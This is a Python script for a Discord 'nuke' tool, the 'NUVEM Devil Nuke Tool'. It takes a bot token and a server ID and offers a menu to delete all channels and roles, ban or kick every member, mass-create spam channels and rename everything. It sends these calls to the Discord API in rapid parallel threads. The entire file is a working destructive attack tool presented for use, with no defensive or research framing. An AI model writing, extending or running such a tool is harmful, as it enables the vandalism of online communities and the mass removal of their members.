import os
import sys
import time
import requests
import threading
from colorama import init, Fore, Style

init(autoreset=True)

API_BASE = "https://discord.com/api/v9"
DELAY = 0.004

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def devil_rgb_cycle():
    colors = [Fore.RED, Fore.MAGENTA, Fore.YELLOW]
    while True:
        for c in colors:
            yield c

color_cycle = devil_rgb_cycle()

def rgb_print(text):
    c = next(color_cycle)
    print(c + text + Style.RESET_ALL)

def get_input(prompt, validate=lambda x: True):
    while True:
        val = input(prompt)
        if validate(val):
            return val
        print(Fore.RED + "Invalid input! Try again.")

def rocket_animation():
    rocket_frames = [
        "    ^\n   / \\\n   | |\n   | |\n  /|_|\\\n  |   |\n  |___|",
        "    ^\n   / \\\n   | |\n  /| |\n  | |_\\\n  |   |\n  |___|",
        "   ^\n  / \\\n  | |\n /| |\n | |_\\\n |   |\n |___|",
        "  ^\n / \\\n | |\n | |\n | |\n | |\n | |",
        " ^\n/ \\\n| |\n| |\n| |\n| |\n| |",
        "|\n|\n|\n|\n|\n|\n|",
        " \n \n \n \n \n \n ",
    ]
    clear()
    for _ in range(3):
        for frame in rocket_frames:
            clear()
            rgb_print(frame)
            time.sleep(0.1)

class NuvemNuker:
    def __init__(self, token, guild_id):
        self.token = token
        self.guild_id = guild_id
        self.headers = {
            "Authorization": f"Bot {token}",
            "Content-Type": "application/json"
        }
        self.session = requests.Session()
        self.session.headers.update(self.headers)

    def api_url(self, endpoint):
        return f"{API_BASE}{endpoint}"

    def get_channels(self):
        r = self.session.get(self.api_url(f"/guilds/{self.guild_id}/channels"))
        if r.status_code == 200:
            return r.json()
        rgb_print(f"Failed to fetch channels. Status: {r.status_code}")
        return []

    def get_roles(self):
        r = self.session.get(self.api_url(f"/guilds/{self.guild_id}/roles"))
        if r.status_code == 200:
            return r.json()
        rgb_print(f"Failed to fetch roles. Status: {r.status_code}")
        return []

    def get_members(self):
        members = []
        after = None
        while True:
            url = self.api_url(f"/guilds/{self.guild_id}/members?limit=100")
            if after:
                url += f"&after={after}"
            r = self.session.get(url)
            if r.status_code != 200:
                rgb_print(f"Failed to get members: {r.status_code}")
                break
            chunk = r.json()
            if not chunk:
                break
            members.extend(chunk)
            after = chunk[-1]['user']['id']
            if len(chunk) < 100:
                break
        return members

    def delete_channel(self, channel_id):
        r = self.session.delete(self.api_url(f"/channels/{channel_id}"))
        return r.status_code == 204

    def delete_role(self, role_id):
        r = self.session.delete(self.api_url(f"/guilds/{self.guild_id}/roles/{role_id}"))
        return r.status_code == 204

    def ban_member(self, user_id):
        r = self.session.put(self.api_url(f"/guilds/{self.guild_id}/bans/{user_id}"), json={"delete_message_days": 0})
        return r.status_code in (200, 201, 204)

    def kick_member(self, user_id):
        r = self.session.delete(self.api_url(f"/guilds/{self.guild_id}/members/{user_id}"))
        return r.status_code == 204

    def create_channel(self, name):
        r = self.session.post(self.api_url(f"/guilds/{self.guild_id}/channels"), json={"name": name, "type": 0})
        return r.status_code == 201

    def rename_channel(self, channel_id, new_name):
        r = self.session.patch(self.api_url(f"/channels/{channel_id}"), json={"name": new_name})
        return r.status_code == 200

    def rename_role(self, role_id, new_name):
        r = self.session.patch(self.api_url(f"/guilds/{self.guild_id}/roles/{role_id}"), json={"name": new_name})
        return r.status_code == 200

def run_threads(target, items):
    threads = []
    for item in items:
        t = threading.Thread(target=target, args=(item,))
        t.start()
        threads.append(t)
        time.sleep(DELAY)
    for t in threads:
        t.join()

def main():
    clear()
    rgb_print("🔥🔥🔥 WELCOME TO NUVEM DEVIL NUKE TOOL 🔥🔥🔥\n")

    token = get_input(Fore.CYAN + "Enter your bot token: ", lambda x: len(x) > 50)
    guild_id = get_input(Fore.CYAN + "Enter the Guild ID to nuke: ", lambda x: x.isdigit())

    nuker = NuvemNuker(token, guild_id)

    while True:
        clear()
        rgb_print("=== NUVEM Devil Menu ===")
        print(f"{Fore.RED}01{Fore.RESET}. Delete All Channels")
        print(f"{Fore.RED}02{Fore.RESET}. Delete All Roles")
        print(f"{Fore.RED}03{Fore.RESET}. Ban All Members")
        print(f"{Fore.RED}04{Fore.RESET}. Kick All Members")
        print(f"{Fore.RED}05{Fore.RESET}. Create Channels")
        print(f"{Fore.RED}06{Fore.RESET}. Rename All Channels")
        print(f"{Fore.RED}07{Fore.RESET}. Rename All Roles")
        print(f"{Fore.RED}08{Fore.RESET}. Exit")

        choice = get_input(Fore.YELLOW + "Choose an option (1-8): ", lambda x: x in [str(i) for i in range(1, 9)])

        rocket_animation()

        if choice == "1":
            channels = nuker.get_channels()
            rgb_print(f"Deleting {len(channels)} channels...")

            def delete_channel_thread(ch):
                if nuker.delete_channel(ch['id']):
                    rgb_print(f"Deleted channel: {ch['name']} ({ch['id']})")
                else:
                    rgb_print(f"Failed to delete channel: {ch['name']} ({ch['id']})")

            run_threads(delete_channel_thread, channels)
            input(Fore.GREEN + "Finished deleting channels! Press Enter to continue.")

        elif choice == "2":
            roles = nuker.get_roles()
            rgb_print(f"Deleting {len(roles)} roles...")

            def delete_role_thread(role):
                # Skip @everyone role
                if role['id'] == nuker.guild_id:
                    return
                if nuker.delete_role(role['id']):
                    rgb_print(f"Deleted role: {role['name']} ({role['id']})")
                else:
                    rgb_print(f"Failed to delete role: {role['name']} ({role['id']})")

            run_threads(delete_role_thread, roles)
            input(Fore.GREEN + "Finished deleting roles! Press Enter to continue.")

        elif choice == "3":
            members = nuker.get_members()
            rgb_print(f"Banning {len(members)} members...")

            def ban_thread(member):
                uid = member['user']['id']
                if nuker.ban_member(uid):
                    rgb_print(f"Banned user ID: {uid}")
                else:
                    rgb_print(f"Failed to ban user ID: {uid}")

            run_threads(ban_thread, members)
            input(Fore.GREEN + "Finished banning members! Press Enter to continue.")

        elif choice == "4":
            members = nuker.get_members()
            rgb_print(f"Kicking {len(members)} members...")

            def kick_thread(member):
                uid = member['user']['id']
                if nuker.kick_member(uid):
                    rgb_print(f"Kicked user ID: {uid}")
                else:
                    rgb_print(f"Failed to kick user ID: {uid}")

            run_threads(kick_thread, members)
            input(Fore.GREEN + "Finished kicking members! Press Enter to continue.")

        elif choice == "5":
            amount = get_input(Fore.YELLOW + "How many channels to create? ", lambda x: x.isdigit() and int(x) > 0)
            amount = int(amount)
            rgb_print(f"Creating {amount} channels...")

            def create_channel_thread(_):
                if nuker.create_channel("nuvem-channel"):
                    rgb_print(f"Created channel nuvem-channel")
                else:
                    rgb_print(f"Failed to create channel")

            run_threads(create_channel_thread, range(amount))
            input(Fore.GREEN + "Finished creating channels! Press Enter to continue.")

        elif choice == "6":
            channels = nuker.get_channels()
            new_name = get_input(Fore.YELLOW + "Enter new name for all channels: ", lambda x: len(x) > 0)
            rgb_print(f"Renaming {len(channels)} channels to '{new_name}'...")

            def rename_channel_thread(ch):
                if nuker.rename_channel(ch['id'], new_name):
                    rgb_print(f"Renamed channel {ch['name']} to {new_name}")
                else:
                    rgb_print(f"Failed to rename channel {ch['name']}")

            run_threads(rename_channel_thread, channels)
            input(Fore.GREEN + "Finished renaming channels! Press Enter to continue.")

        elif choice == "7":
            roles = nuker.get_roles()
            new_name = get_input(Fore.YELLOW + "Enter new name for all roles: ", lambda x: len(x) > 0)
            rgb_print(f"Renaming {len(roles)} roles to '{new_name}'...")

            def rename_role_thread(role):
                if nuker.rename_role(role['id'], new_name):
                    rgb_print(f"Renamed role {role['name']} to {new_name}")
                else:
                    rgb_print(f"Failed to rename role {role['name']}")

            run_threads(rename_role_thread, roles)
            input(Fore.GREEN + "Finished renaming roles! Press Enter to continue.")

        elif choice == "8":
            rgb_print("Exiting NUVEM... Goodbye!")
            break

if __name__ == "__main__":
    main()